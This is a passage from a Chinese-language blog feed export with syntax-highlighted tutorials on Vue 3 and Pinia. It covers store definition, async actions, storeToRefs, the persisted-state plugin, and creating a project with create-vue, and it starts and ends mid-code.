<span class="title function_">defineStore</span>(<span class="string">&#x27;counter&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">const</span> doubleCount = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> count.<span class="property">value</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">addCount</span> = (<span class="params"></span>) =&gt; &#123;count.<span class="property">value</span>++&#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">subCount</span> = (<span class="params"></span>) =&gt; &#123;count.<span class="property">value</span>--&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        count,</span><br><span class="line">        doubleCount,</span><br><span class="line">        addCount,</span><br><span class="line">        subCount</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>也有 Option Store 定义方式，这种非常麻烦难看懂，我不喜欢</li><li>你可以认为 <code>state</code> 是 store 的数据 (<code>data</code>)，<code>getters</code> 是 store 的计算属性 (<code>computed</code>)，而 <code>actions</code> 则是方法 (<code>methods</code>)。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCounterStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;counter&#x27;</span>, &#123; </span><br><span class="line">    <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123; <span class="attr">count</span>: <span class="number">0</span> &#125;), </span><br><span class="line">    <span class="attr">getters</span>: &#123; </span><br><span class="line">        <span class="attr">double</span>: <span class="function">(<span class="params">state</span>) =&gt;</span> state.<span class="property">count</span> * <span class="number">2</span>, </span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">actions</span>: &#123; </span><br><span class="line">        <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++ </span><br><span class="line">        &#125;, </span><br><span class="line">    &#125;, </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>在组件中调用 store</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 顶层组件App.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> middleCom <span class="keyword">from</span> <span class="string">&#x27;@/components/middleCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> bottomCom <span class="keyword">from</span> <span class="string">&#x27;@/components/bottomCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useCounterStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store/counter&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> counter = <span class="title function_">useCounterStore</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>顶层数据： &#123;&#123; counter.count &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>双倍结果： &#123;&#123; counter.doubleCount &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">middleCom</span>&gt;</span><span class="tag">&lt;/<span class="name">middleCom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bottomCom</span>&gt;</span><span class="tag">&lt;/<span class="name">bottomCom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件middleCom.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useCounterStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store/counter&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> counter = <span class="title function_">useCounterStore</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        中层数据 - &#123;&#123; counter.count &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;counter.addCount&quot;</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 子组件bottomCom.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useCounterStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store/counter&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> counter = <span class="title function_">useCounterStore</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        底层数据 - &#123;&#123; counter.count &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;counter.subCount&quot;</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240401153151.png" alt="image.png"></p><h2 id="action-异步实现"><a href="#action-异步实现" class="headerlink" title="action 异步实现"></a>action 异步实现</h2><p>在 pinia 中，不再像 Vuex 那样需要考虑 mutations&#x2F;actions 实现同步&#x2F;异步，现在的 actions 都可以实现，同步实现在上面的代码中已经写了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useChannelStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;channel&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> channelList = <span class="title function_">ref</span>([])</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">getList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> obj = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;http://geek.itheima.net/v1_0/channels&#x27;</span>)</span><br><span class="line">        channelList.<span class="property">value</span> = obj.<span class="property">data</span>.<span class="property">data</span>.<span class="property">channels</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(channelList.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        channelList,</span><br><span class="line">        getList</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="storeToRefs-工具函数"><a href="#storeToRefs-工具函数" class="headerlink" title="storeToRefs 工具函数"></a>storeToRefs 工具函数</h2><p>在调用数据时，有时候需要解构库数据，如果直接解构会导致数据失去响应式特性</p><p>使用 storeToRefs 工具函数，可以辅助保持数据 （state+getter）的响应式解构</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> middleCom <span class="keyword">from</span> <span class="string">&#x27;@/components/middleCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> bottomCom <span class="keyword">from</span> <span class="string">&#x27;@/components/bottomCom.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; storeToRefs &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useCounterStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store/counter&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123; useChannelStore &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store/channel&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> counter = <span class="title function_">useCounterStore</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> channel = <span class="title function_">useChannelStore</span>()</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 直接解构会导致数据失去响应式特性</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// const &#123; count, doubleCount &#125; = counter</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> &#123; count, doubleCount &#125; = <span class="title function_">storeToRefs</span>(counter)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> &#123; getList &#125; = channel <span class="comment">// 不过函数方法不需要响应式所有可以直接解构</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> &#123; channelList&#125; = <span class="title function_">storeToRefs</span>(channel)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>顶层数据： &#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>双倍结果： &#123;&#123; doubleCount &#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">middleCom</span>&gt;</span><span class="tag">&lt;/<span class="name">middleCom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bottomCom</span>&gt;</span><span class="tag">&lt;/<span class="name">bottomCom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getList&quot;</span>&gt;</span>获取列表<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in channelList&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Pinia-数据持久化插件"><a href="#Pinia-数据持久化插件" class="headerlink" title="Pinia 数据持久化插件"></a>Pinia 数据持久化插件</h1><p>官方文档：<a href="https://prazdevs.github.io/pinia-plugin-persistedstate/zh/">https://prazdevs.github.io/pinia-plugin-persistedstate/zh/</a></p><ol><li>选择喜欢的包管理器安装依赖：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i pinia-plugin-persistedstate</span><br><span class="line">yarn add pinia-plugin-persistedstate</span><br><span class="line">pnpm i pinia-plugin-persistedstate</span><br></pre></td></tr></table></figure><ol start="2"><li>在 main.js 中，将插件添加到 pinia 实例上</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> piniaPluginPersistedstate <span class="keyword">from</span> <span class="string">&#x27;pinia-plugin-persistedstate&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">pinia.<span class="title function_">use</span>(piniaPluginPersistedstate) <span class="comment">// 因为是 pinia 的插件，所有是给 pinia</span></span><br><span class="line">app.<span class="title function_">use</span>(pinia).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>创建 Store 时，将 <code>persist</code> 选项设置为 <code>true</code>。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; computed, ref &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCounterStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;counter&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> count = <span class="title function_">ref</span>(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">const</span> doubleCount = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> count.<span class="property">value</span> * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">addCount</span> = (<span class="params"></span>) =&gt; &#123;count.<span class="property">value</span>++&#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">subCount</span> = (<span class="params"></span>) =&gt; &#123;count.<span class="property">value</span>--&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        count,</span><br><span class="line">        doubleCount,</span><br><span class="line">        addCount,</span><br><span class="line">        subCount</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    <span class="attr">persist</span>: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3-基本用法</title>
      <link href="/2024/03/31/Vue3-%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2024/03/31/Vue3-%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="create-vue-创建项目"><a href="#create-vue-创建项目" class="headerlink" title="create-vue 创建项目"></a>create-vue 创建项目</h1><p>create-vue 是Vue官方新的脚手架工具，底层切换到了 vite （下一代前端工具链），为开发提供极速响应</p><ol><li>需要安装 16.0 或更高版本的 Node.js</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240328141459.png" alt="image.png"></p><ol start="2"><li>使用指令创建一个 Vue3 项目（居然是中文提示）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240328141541.png" alt="image.png"></p><ol start="3"><li>安装依赖，运行项目</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在项目目录下</span><br><span class="line">npm install</span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240328141727.png" alt="image.png"></p><h2 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240328143512.png" alt="image.png"></p><p><strong>关键文件</strong>：</p><ol><li>vite.config.js ：项目的配置文件，基于 vite 的配置</li><li>package.json ：项目包文件，核心依赖项变成了 Vue3.x 和 vite</li><li>main.js ：入口文件，createApp 函数创建应用实例</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./assets/main.css&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>app.vue ：根组件，SFC单文件组件 script - template - style</li></ol><p><strong>变化</strong>：</p><ul><li>脚本 script 和模板 template 顺序调整</li><li>模板 template 不在要求唯一根元素</li><li>脚本 script 添加 setup 标识支持组合式API</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">HelloWorld</span> <span class="keyword">from</span> <span class="string">&#x27;./components/HelloWorld.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">TheWelcome</span> <span class="keyword">from</span> <span class="string">&#x27;./components/TheWelcome.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;125&quot;</span> <span class="attr">height</span>=<span class="string">&quot;125&quot;</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">HelloWorld</span> <span class="attr">msg</span>=<span class="string">&quot;You did it!&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">TheWelcome</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>index.html ：单页入口，提供 id 为 app 的挂载点</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/favicon.ico&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="组合式-API"><a href="#组合式-API" class="headerlink" title="组合式 API"></a>组合式 API</h1><h2 id="setup-选项"><a href="#setup-选项" class="headerlink" title="setup 选项"></a>setup 选项</h2><ol><li>执行时机，比 beforeCreate 还要早</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/5.png" alt="5.png"></p><ol start="2"><li>setup 函数，由于太早执行，所有获取不到this，得到的是 undefined</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        setup () &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;setup函数&#x27;</span>, <span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        beforeCreate () &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeCreate函数&#x27;</span>, <span class="variable language_">this</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240331134603.png" alt="image.png"></p><ol start="3"><li>在 setup 中定义的函数和数据，必须在 return 中返回才能被模板使用</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        setup () &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> message = <span class="string">&#x27;Hello Vue3&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> <span class="title function_">printMsg</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                